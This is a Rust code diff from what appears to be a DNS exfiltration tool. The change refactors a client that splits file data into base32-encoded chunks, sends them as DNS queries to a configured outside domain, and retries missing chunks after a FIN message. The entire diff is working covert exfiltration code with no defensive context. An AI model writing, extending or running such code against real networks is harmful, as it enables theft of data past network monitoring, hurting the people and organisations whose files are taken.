@@ -16,9 +16,8 @@ const CHUNK_SIZE: usize = 39;
 
 #[derive(Clone, Debug)]
 pub struct ExfilPayload {
-    pub filename: PathBuf,
+    pub filename: String,
     pub data: Vec<u8>,
-    pub is_directory: bool,
 }
 
 #[derive(Debug, Clone)]
@@ -97,15 +96,9 @@ impl Client {
         Ok(())
     }
 
-    async fn send_fin(&self, client: &mut AsyncClient, session_id: &str, total_chunks: usize, is_directory: bool) -> Result<Vec<usize>, DnsexError> {
-        let flags = if is_directory {
-            ChunkFlag::Fin as u32 | ChunkFlag::Directory as u32
-        } else {
-            ChunkFlag::Fin as u32
-        };
-
+    async fn send_fin(&self, client: &mut AsyncClient, session_id: &str, total_chunks: usize) -> Result<Vec<usize>, DnsexError> {
+        let flags = ChunkFlag::Fin as u32;
         let fin_fqdn = self.build_fqdn(&BASE32_NOPAD.encode("EOF".as_bytes()), total_chunks, session_id, flags);
-
         let responses = self.send_query(client, &fin_fqdn).await?;
         let mut missing: Vec<usize> = Vec::new();
 
@@ -138,17 +131,17 @@ impl Client {
         let mut client = self.get_client().await?;
         let session_id = Client::generate_session_id();
         let total_chunks = payload.data.chunks(CHUNK_SIZE).count();
-        let filename = payload.filename.file_name().unwrap().to_string_lossy().to_string();
 
-        println!("Exfiltrating {} to {}", payload.filename.to_string_lossy(), self.config.domain);
-        self.send_init(&mut client, &filename, &session_id, total_chunks).await?;
-        self.send_data(&mut client, &payload.data, &filename, &session_id, total_chunks).await?;
+        println!("Exfiltrating {} to {}", &payload.filename, self.config.domain);
+        self.send_init(&mut client, &payload.filename, &session_id, total_chunks).await?;
+        self.send_data(&mut client, &payload.data, &payload.filename, &session_id, total_chunks)
+            .await?;
 
         let mut retries = 0;
         const MAX_RETRIES: usize = 5;
 
         loop {
-            let missing = self.send_fin(&mut client, &session_id, total_chunks, payload.is_directory).await?;
+            let missing = self.send_fin(&mut client, &session_id, total_chunks).await?;
 
             if missing.is_empty() {
                 break;
